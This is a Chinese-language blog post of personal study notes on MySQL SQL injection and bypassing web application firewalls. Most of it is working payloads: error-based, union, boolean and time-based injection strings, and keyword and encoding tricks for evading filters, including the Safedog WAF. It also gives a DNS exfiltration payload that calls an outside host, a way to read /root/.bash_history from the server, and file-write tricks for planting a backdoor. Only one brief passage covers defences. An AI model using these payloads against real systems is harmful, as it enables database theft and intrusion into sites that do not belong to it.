---
title: SQL注入研究
date: 2019-02-02 23:14:09
tags: 
- SQL注入
---
深入的探究下SQL的waf和绕过。试试自己写一个简单的扫描器出来。
<!--more-->
**参考文章**
文章很多...
https://xz.aliyun.com/t/1027
https://osandamalith.com/2017/02/08/mysql-injection-in-update-insert-and-delete/
http://netsecurity.51cto.com/art/201701/526861.htm
https://xz.aliyun.com/t/1586
https://xz.aliyun.com/t/2288
https://xz.aliyun.com/t/2359
https://xz.aliyun.com/t/253
https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html
https://xz.aliyun.com/t/3950
https://lightless.me/archives/read-mysql-client-file.html
https://xz.aliyun.com/t/3973
https://xz.aliyun.com/t/1174
https://xz.aliyun.com/t/2069
http://drops.xmd5.com/static/drops/tips-7883.html
https://mp.weixin.qq.com/s/S318-e4-eskfRG38HZk_Qw
https://xz.aliyun.com/t/40
https://notwhy.github.io/2018/06/sql-injection-fuck-waf/
https://xz.aliyun.com/t/2583
https://xz.aliyun.com/t/1248
https://xz.aliyun.com/t/2167
https://xz.aliyun.com/t/2199
https://xz.aliyun.com/t/2365
https://xz.aliyun.com/t/1
https://xz.aliyun.com/t/2719
https://xz.aliyun.com/t/1652
https://xz.aliyun.com/t/492
https://xz.aliyun.com/t/49
https://xz.aliyun.com/t/250
https://xz.aliyun.com/t/246
http://blog.nsfocus.net/mysql-vulnerability-technical-analysis-protection-programs/
https://www.cnblogs.com/dliv3/p/6412653.html
https://xz.aliyun.com/t/1122
# 基础知识：

**基本语句：**
![](/images/19-2-8_SQL_基本语句1.png)

**基础知识：**
	3306端口。
	默认用户root

**基础命令：**
```
	status
	select version();
	select @@version;
	select @@global.version;
	select user();
	select current_user();
	select current_user;
	select system_user();
	select session_user();
	select @@datadir;
	select database();
	select schema();
	select @@hostname;
	select @@basedir
```

**运算符**
/ - + * | & ^ || && xor or and

**注释:**
- --空格
- --+(url中+代表空格)
- /**/
- #
- /*!xxxxxselect user()*/ 5位数字

**查看权限：**
```
	SELECT file_priv FROM mysql.user WHERE user = 'root';（需要root用户来执行）
	SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '%username%';（普通用户也可以）
```
**文件写入：**	
```
	select 'test' into outfile "d:\\test.txt"; into outfile不可以覆盖已经存在的文件
```

# 特性
一些有意思的语句
```SQL
字符串等于0
	select 'test' =0;
	select !'test';
	select 'test' + 123;
	select 'test' + ~0;
	select ~0 + 0e0;
	select (~0+0e0) = ('test' + ~0) ;
	select 'test' | ~0;
information_shcema表中存有所有的表。
	select table_name from information_schema.tables where table_schema like 0x74657374
```

## secure_file_priv对读写文件的影响

使用into outfile快速写一句话后门写入不了，可能时secure_file_priv的影响

![](/images/19-2-8_SQL_特性1.jpg)
![](/images/19-2-8_SQL_特性2.jpg)
语句如下：
```
create table test.m1(code text);
load data local infile '/root/.bash_history' into table test.m1 fields terminated by ''
```



# 注入思路
## 过滤了字段和逗号
如：
```SQL
select 1,2 union select * from  ( (select user())a JOIN  (select version())b );
select * from user where id ='-1' union select 1,2,(select c.2 from (select 1,2 union select * from users)c limit 1,2);
```
格式如下：
```SQL
union all
select * from(
    (select 1)a join(
        select F.[需要查询的字段号] from(
            select * from [需要查询的表有多少个字段就join多少个]
            union
            select * from [需要查询的表] [limit子句]
        )F-- 我们创建的虚拟表没有表名，因此定义一个别名，然后直接[别名].[字段号]查询数据
    )b-- 同上[还差多少字段就再join多少个，以满足字段数相同的原则]
)
```
## 将字符串转换为数字：

**参考：**
- https://osandamalith.com/2017/02/08/mysql-injection-in-update-insert-and-delete/

在mysql中字符串等于0，通过将数据->16禁止->10进制
在只有一个表的情况下 利用update,insert进行表的信息获取

**提取表名：**
```SQL
select conv(hex(substr((select table_name from information_schema.tables where table_schema=schema() limit 0,1),1 + (n-1) * 8, 8*n)), 16, 10);
```
**提取列名：**
```
select conv(hex(substr((select column_name from information_schema.columns where table_name=’Name of your table’ limit 0,1),1 + (n-1) * 8, 8*n)), 16, 10);
```

在update和insert中在子查询中使用了同表的数据，会报错：
![](/images/19-2-9_SQL_思路1.png)
可以这样操作：
```
update users set username = 'j7ur8'| conv(hex(substr((select username from (select * from users where id=1) as x limit 0,1 ) ,1 + (1-1) * 8, 8 * 1)),16, 10) where id=1;
```
![](/images/19-2-9_SQL_思路2.png)

此方法存在MySQL5.7存在限制。因为SQL mode=>'STRICT_TRANS_TABLES';
可以把语句中的'j7ur8'改为'0'就可以了。
```
update users set username = '0'| conv(hex(substr((select username from (select * from users where id=1) as x limit 0,1 ) ,1 + (1-1) * 8, 8 * 1)),16, 10) where id=1;
```

文章中也给出了一个爆错的方法：
```
select * from (select(name_const(version(),1)),name_const(version(),1))a;
```
name_const的参数需要时常量，所以无法进行语句查询。

**解密：**
```
SQL:
	select unhex(conv(value, 10, 16));
Python:
	dec = lambda x:("%x"%x).decode('hex')
Ruby:
	dec = lambda { |x| puts x.to_s(16).scan(/../).map { |x| x.hex.chr }.join }
	dec = lambda { |x| puts x.to_s(16).scan(/\w+/).pack("H*") }
```
## 基于约束

**参考：**
- https://xz.aliyun.com/t/1269

注册一个账户:`admin          1`
在数据库配置中:`username varchar(15)`
所以导致插入的数据变成：`admin         `
而在数据库中如下：
```
+-------------------------+-------------+ 
| username                | password    | 
+-------------------------+-------------+ 
| admin                   | my_password | 
| admin                   | random_pass | 
+-------------------------+-------------+ 
```
第一个没用空格，第二个有空格。所以就可能以真实的admin用户登陆。

**防御措施**

显然，要想开发安全的软件，必须对这种安全漏洞严加防范。下面是我们可采取的几项防御措施：

- 应该为要求/预期具有唯一性的那些列添加UNIQUE约束。这实际上是一个非常重要的软件开发规则。即使您的代码已经提供了完整性检查，也要正确定义您的数据。由于'username'列具有UNIQUE约束，所以插入另一个记录将是不可能的。这两个字符串将被视为等同的，并且INSERT查询将失败。
- 最好使用'id'作为数据库表的主键。此外，数据应该通过程序中的id进行跟踪。
- 为了增加安全性，您还可以手动方式将输入参数修剪为特定长度(具体长度可以视数据库的中设置而定)。

## innodb存储引擎的利用
**参考**
- https://xz.aliyun.com/t/1586

MySQL>5.6增加了两个新表`innodb_index_stats`和`innodb_table_stats`用于记录更改和新创建的数据库和表的信息。此信息永久保留。

因此可以有：
```
select table_name from mysql.innodb_table_stats where database_name=schema();
```

## 延时注入新方法
**参考**
- https://zhuanlan.zhihu.com/p/35245598

最基本的使用sleep(5)和benchmark()进行
还可以使用

**笛卡尔积**
```
SELECT count(*) FROM information_schema.columns A, information_schema.columns B;
```

**get_lock**
缺陷在于在apache和php搭建的环境中需要使用mysql_pconnect函数连接数据库。
![](/images/19-2-9_SQL_思路3.png)

**正则bug**
```
select rpad('a',10485,'a') RLIKE concat(repeat('(a.*)+',10480),'b');
```
![](/images/19-2-9_SQL_思路4.png)

## DNS注入
**参考**
- https://xz.aliyun.com/t/2359
- https://www.jianshu.com/p/19ef493da938

**局限性**
mysql的话secure_file_priv为空的时候可以使用,版本基本在5.5.53之前。

**payload**
```
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT 2333),'.ceye.io/abc'));
```

## 报错注入
**参考**
- https://xz.aliyun.com/t/253

在自己的vps测试了下还能够使用的报错函数有：
`floor`,`extractvalue`,`updatexml`
![](/images/19-2-9_SQL_思路5.png)
```
select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;
select extractvalue(1,concat(0x7e,(select @@version),0x7e));
select updatexml(1,concat(0x7e,(select @@version),0x7e),1);
```
还有一些其他姿势

**数据溢出**
参考：https://www.thinkings.org/2015/08/10/bigint-overflow-error-sqli.html
版本：5.5<version<5.5.53
姿势：`select (select(!x-~0)from(select(select user())x)a);`
报错信息长度限制在my_error.c中`define ERRMSGSIZI(512)`

**列名重复**
利用name_const构建表名报错版本，name_const要求参数是常量，所以没什么好利用的。
```
select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
```
join函数利用此特性可以爆表名
```
mysql> select *  from(select * from test a join test b)c;
ERROR 1060 (42S21): Duplicate column name 'id'
mysql> select *  from(select * from test a join test b using(id))c;
ERROR 1060 (42S21): Duplicate column name 'name'
```

## Limit后的注入
**参考**
- https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html

**测试语句**
```SQL
SELECT field FROM table WHERE id > 0 ORDER BY id LIMIT injection_point
```

**select语法**
```SQL
SELECT
    [ALL | DISTINCT | DISTINCTROW ]
      [HIGH_PRIORITY]
      [STRAIGHT_JOIN]
      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]
      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]
    select_expr [, select_expr ...]
    [FROM table_references
      [PARTITION partition_list]
    [WHERE where_condition]
    [GROUP BY {col_name | expr | position}
      [ASC | DESC], ... [WITH ROLLUP]]
    [HAVING where_condition]
    [ORDER BY {col_name | expr | position}
      [ASC | DESC], ...]
    [LIMIT {[offset,] row_count | row_count OFFSET offset}]
    [PROCEDURE procedure_name(argument_list)]
    [INTO OUTFILE 'file_name'
        [CHARACTER SET charset_name]
        export_options
      | INTO DUMPFILE 'file_name'
      | INTO var_name [, var_name]]
    [FOR UPDATE | LOCK IN SHARE MODE]]
```

**payload**
```SQL
基于爆错
SELECT * FROM users WHERE id>0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
基于时间
SELECT * FROM users WHERE id > 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)
```

新版本的貌似不能支持analyse里面进行select语句查询了

# 整理

一个注入点，首先判断是什么位置的注入：where、update、insert、order by、limit；
然后根据不同的注入位置，猜测查询语句。这个可能需要后面进行一些框架注入漏洞的学习之后才能够猜的准确。
首先从where分析

## where查询的注入

where查询的最基本语句：
`select username from users where id='$id'`

首先进行最基本的测试，进行判断能否成功闭合语句。

**测试语句**
有以下但不限于以下的语句：
```SQL
0 or 1
0 or 1 %23
0 or 1 --+
0' or '1
0' or '1' %23
0' or '1' --+ 
0" or "1
0') or ('1
0') or ('1') %23
0') or ('1') --+
0") or ("1
0'^'1
0'^'1' %23
0'^'1' --+
```

`or`可以替换成`||`,`/*!12345||*/`,`Or`等。还可以字符编码用一些unicode支持的字符替换O或者r字符，某些条件下可以绕过参数检测。并且要考虑where后面可能还有`limit`，`order by`等子句。

通过以上或者其他的语句，如果能成功闭合，我们接下来要判断的就是注入类型。
注入类型按我的理解是分为`有无回显`两种情况。有回显分`报错`、`布尔`两种类型。无回显就构造回显，常见的有盲注，不常见的可能DNS注入算是，但是dns注入在高版本是受到限制的。至于其他一些不常见的我希望后面自己可以研究出来！上面的思路变成思维导图如下：
```
有无回显->有->有无爆错->有->爆错注入
   ⬇		 ⬇  
  无	         无->union注入
   ⬇		 ⬇				   
 盲注       是否为布尔->是->布尔注入        
```

分析从`报错注入`->`union注入`->`布尔注入`->`盲注`

### 报错注入

报错注入在MySQL5.5版本前后貌似是个分水岭，之前的版本存在的报错语句有很多种。之后就少了很多，可能也有更多，但是没有公开。
常用的函数有：`floor`,`extractvalue`,`updatexml`,`name_const`；还有数据溢出和join爆列2种；

**语句**

最基本的探测语句：
```SQL
select count(*),concat((version()),floor(rand(0)*2))x from information_schema.tables group by x;
select extractvalue(1,concat(0x7e,(select @@version),0x7e));
select updatexml(1,concat(0x7e,(select @@version),0x7e),1);
select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
select *  from(select * from test a join test b)c;
select *  from(select * from test a join test b using(id))c;
select (select(!x-~0)from(select(select user())x)a);
```
具体情况需要具体结合。其中updatexml和floor、extractvalue类似。简单的列出floor的数据后去过程：
```SQL
	select 1 from(select count(*),concat((select concat(0x7e,version(),0x7e)),floor(rand(0)*2))x from information_schema.tables group by x)a;
	select 1 from(select count(*),concat((select distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a;
	
	select 1 from(select count(*),concat((select distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a;

	select 1 from(select count(*),concat((select distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name='users' LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a;

	select 1 from(select count(*),concat((select distinct concat(0x7e,column,0x7e) FROM database.table LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a;
```
name_cons由于参数只能为常量，没有更好的利用手段，只能爆出版本号。
join的利用和name_const是一个特性，可以爆出列名。

**绕过**

肯定会添加一些单词到黑名单，可以考虑双写(oorr)，大小写，内联注释，编码，等价替换，用户变量等绕过手段，如：
- 版本大于`5.6`，如果过滤了information_schema可以考虑`mysql.innodb_table_stats`，`mysql.innodb_index_stats`
```SQL
select 1 from(select count(*),concat((select distinct concat(0x7e,table_name,0x7e) FROM mysql.innodb_index_stats where database_name=schema() LIMIT 0,1),floor(rand(0)*2))x from mysql.innodb_index_stats group by x)a;
```
- 数据库可以使用0x进制绕过。
- floor的rand函数被过滤可以考虑用户变量替代。
```SQL
select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)
```
- 编码绕过：
```
s%u0065lect->select
s%u00f0lect->select
字母a：
 %u0000 %u0041 %u0061 %u00aa %u00e2
单引号：
 %u0027 %u02b9 %u02bc %u02c8 %u2032 %uff07 %c0%27 %c0%a7 %e0%80%a7
空白：
 %u0020 %uff00 %c0%20 %c0%a0 %e0%80%a0
左括号(： 
 %u0028 %uff08 %c0%28 %c0%a8 %e0%80%a8
右括号)：
 %u0029 %uff09 %c0%29 %c0%a9 %e0%80%a9
```
### union注入
有回显，使用order by探测列。如果被过滤了只能强行使用union慢慢测试了....

**语句**

注入数据的过程：
```SQL
union select 1,group_concat(schema_name),3 from information_schema.schemata
	union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'
	union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'
```

**绕过**

考虑双写(oorr)，大小写，内联注释，编码，等价替换，用户变量等绕过手段,如：
- 过滤了`union select`
```
select 1 union(select(username)from(users));
```
`union select`里面还可以使用`all`,`distinct`。也可以使用编码`09 0A 0B 0C 0D A0 20`替代空格等。
- 过滤了空格
```SQL
select~1
select@1
select-1
select!1
select username from test.users where id =1e0union select 1;
select username from test.users where id =.1union select 1;
select'1'
```
- 过滤了where
```SQL
union select username from users limit 1;
```
- 过滤了limit
```SQL
union select username from users group by id having id=1;
```
- 过滤了having
```SQL
unino select group_concat(username) from users;
```

### 布尔注入 ###
在传统的观念布尔注入算是盲注的一种，因为无法直接观看到注入结果，最好的方法就是写脚本。但是我觉得也算是一种隐晦的回显。

**用到的函数和字符**
- 字符截取函数
```
Mid(version(),1,1)
Substr(version(),1,1)
Substring(version(),1,1)
Lpad(version(),1,1)
Rpad(version(),1,1)
Left(version(),1)
reverse(right(reverse(version()),1)
```
- 字符串连接函数
```
concat(version(),'|',user());
concat_ws('|',1,2,3)
group_concat(version(),'~')
```
- 字符转换
```
Char(49)
Hex('a')
Unhex(61)
```
- 逻辑语言
```
+ = < > && || ^
regexp like rlike
```

**语句**

利用上面的构造比较语句吧...太多了....
主要利用的就是if语句如：
`if(length(user())>1,1,0)`
**绕过**
双写(oorr)，大小写，内联注释，编码，等价替换，用户变量等绕过手段
- 过滤了逗号
```
limit 1 offset 0
mid(version() from 1 for 1)
```


### 盲注
和布尔注入的区别就是，把`if(length(user())>1,1,0)`的1变成了sleep(5),`if(length(user())>1,sleep(5),0)`

然后几种延时手法:
笛卡尔积、get_lock、正则bug、sleep、benchmark

## limit后的注入：
- 基于爆错
```
SELECT * FROM users WHERE id>0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
```
- 基于时间
SELECT * FROM users WHERE id > 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)

## insert update注入
- 插入的数据中都可以使用子查询查询他表内容，但是如果只有一个表的话可以使用这种方法：
```SQL
update users set username = 'j7ur8'| conv(hex(substr((select username from (select * from users where id=1) as x limit 0,1 ) ,1 + (1-1) * 8, 8 * 1)),16, 10) where id=1;
```
但是高版本中存在限制。strict_trans_tables。只要把j7ur8改成0就可以了
- 报错：
```sql
UPDATE `mytable` join (select updatexml(1,concat(0x23,user()),1))b join `mytable` `b` SET `username`='admin' WHERE sex=1;
ERROR 1105 (HY000): XPATH syntax error: '#root@localhost'
```
## order by注入

**语句**
```SQL
	select * from users order by 1 and If(ascii(substr(database(),1,1))=116,0,sleep(1));
	(SELECT IF(SUBSTRING(current,1,1)=CHAR(115), BENCHMARK(50000000,md5('1')),null) FROM (select database() as current) as tb1)
	rand(ascii(left(database(),1))=116)
	1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)\
	1 into outfile "c:\\wamp\\www\\sqllib\\test1.txt"
```

# 过狗

参考几篇过狗的文章，总结了下语句。

**文章**
- https://xz.aliyun.com/t/1174
- https://xz.aliyun.com/t/2069
- http://drops.xmd5.com/static/drops/tips-7883.html
- https://mp.weixin.qq.com/s/S318-e4-eskfRG38HZk_Qw
- https://notwhy.github.io/2018/06/sql-injection-fuck-waf/

**基础知识**
![](/images/19-2-16_SQL_过狗1.webp)


**语句**
- 查询语句
```
select * from cms where id='{$_GET['id']}'
```
- 绕过语句
```SQL
id=3'/*!and*/ 2e1/**/=2e1--+
id=2e1'/*!and*/ 2e1/**/=2e1union(/*.1112*//**//*!*/(select@1/**/,2,database/**/(),4,5))--+
id=2e1'/*!and*/ 2e1/**/=2e1union(/*.1112*//**//*!*/(select@1/**/,2,group_concat(table_name),4,5 from information_schema.tables where table_schema=0x74657374))--+
id=1 and{`version`length((select/*!50000schema_name*/from/*!50000information_schema.schemata*/limit 0,1))>0}
id=-11/*!union/*!select/*!1,(select/*!password/*!from/*!test.user limit 0,1),3*/
id=-11 union--+%0aselect 1,(select--+%0apassword from --%01%0atest.user limit 0,1),3
id=@a:=(select@b:=`username`from{a test.user}limit0,1)union--%0aselect'1',@a,3
id=-1/*!union--%01%0aselect1,password,3 from test.user*/
select * from users where id=\Nunion select 1;
select * from users where id=1.1union select 1;
select * from users where id=8e0union select 1;
select * from users where id=/*!50000union*/ select 1;
select{x 1};  // https://dev.mysql.com/doc/refman/5.7/en/expressions.html
select\N 1;  

```
waf检测到sql中有长字符可能存在绕过：
![](/images/19-2-16_SQL_过狗2.png)



